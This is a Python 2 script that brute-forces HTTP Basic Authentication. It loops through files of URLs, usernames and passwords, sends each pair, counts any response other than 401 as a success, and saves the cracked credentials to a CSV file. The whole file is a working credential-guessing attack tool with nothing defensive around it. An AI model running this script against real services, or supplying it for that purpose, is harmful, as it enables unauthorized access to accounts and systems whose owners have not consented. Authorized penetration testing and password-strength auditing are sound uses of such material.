#!/usr/bin/env python
# -*- coding: utf-8 -*-
# pylint: disable=C0103
# pylint: disable=C0413
# pylint: disable=W0702

'''
Script that tries list of passwords against HTTP Basic Authorization.

Dependencies:
    * python2
        # Debian/Ubuntu: apt-get install python
        # Fedora: dnf install python

    * requests
        # Debian/Ubuntu: apt-get install python-requests
        # Fedora: dnf install python2-requests
'''

import calendar
import os
import sys
import time
import requests
from requests.auth import HTTPBasicAuth

if len(sys.argv) != 4:
    print 'Usage: ' + sys.argv[0] + ' [urls-file] [usernames-file] [passwords-file]'
    print "    * urls-file - File that contains list of urls."
    print "    * userbames-file - File that contains list of usernames."
    print "    * passwords-file - File that contains list of passwords.\n"
    sys.exit(1)

URLS_FILE = sys.argv[1]
USERNAMES_FILE = sys.argv[2]
PASSWORDS_FILE = sys.argv[3]

for filename in [URLS_FILE, USERNAMES_FILE, PASSWORDS_FILE]:
    if not os.path.isfile(filename):
        print 'Error: file ' + '"' + filename + '"' + " doesn't exist.\n"
        sys.exit(1)

URLS = list()

RESULT_FILE = 'http-basic-auth-brute-' + str(calendar.timegm(time.gmtime())) + '.csv'
RESULT_FILE = os.path.dirname(os.path.realpath(__file__)) + '/' + RESULT_FILE

with open(URLS_FILE, 'r') as urls_file:
    for url in urls_file:
        url = url.strip()
        if url not in URLS:
            URLS.append(url)

if bool(URLS):
    for url in URLS:
        print '> Testing URL: ' + url

        with open(USERNAMES_FILE, 'r') as usernames:
            for username in usernames.readlines():
                username = username.strip()
                found = None

                with open(PASSWORDS_FILE, 'r') as passwords:
                    for password in passwords.readlines():
                        password = password.strip()

                        try:
                            response = requests.get(
                                url,
                                auth=HTTPBasicAuth(username, password),
                                timeout=3
                            )

                            sys.stdout.write('.')
                            sys.stdout.flush()

                            if response.status_code != 401:
                                print
                                print '> Success: ' + username + ':' + password
                                found = url + ',' + username +',' + password
                        except KeyboardInterrupt:
                            print
                            sys.exit(0)
                        except:
                            pass

                        if bool(found):
                            with open(RESULT_FILE, 'a+') as result_file:
                                result_file.write(url + ',' + found + "\n")
                            break

                if bool(found):
                    break
    print
print '> Finished.'
